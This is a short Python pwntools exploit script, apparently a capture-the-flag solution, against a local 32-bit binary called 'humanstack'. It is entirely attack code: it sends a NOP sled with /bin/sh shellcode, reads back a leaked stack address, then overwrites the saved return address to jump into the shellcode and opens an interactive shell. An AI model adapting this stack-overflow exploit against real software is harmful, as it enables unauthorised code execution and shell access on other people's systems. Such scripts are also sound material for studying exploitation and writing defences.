#!/usr/bin/python

from pwn import *

e = ELF("./humanstack")
l = e.libc
p = process(e.path)

sc = asm(shellcraft.i386.linux.sh())

raw_input(">>> ")

payload = ''
payload += asm("nop") * (0x100-len(sc))
payload += sc
payload += "BBBB"
payload += p8(1)

p.recvuntil(">>> ")
p.send(payload)
p.recvuntil("0x")
ret = int(p.recvuntil(" "), 16) - 0x100
p.recvuntil("\n")

log.info("return to 0x%x", ret)

payload = ''
payload += asm("nop") * (0x100-len(sc))
payload += sc
payload += p32(ret)
payload += p8(0)
p.recvuntil(">>> ")
p.send(payload)

p.interactive()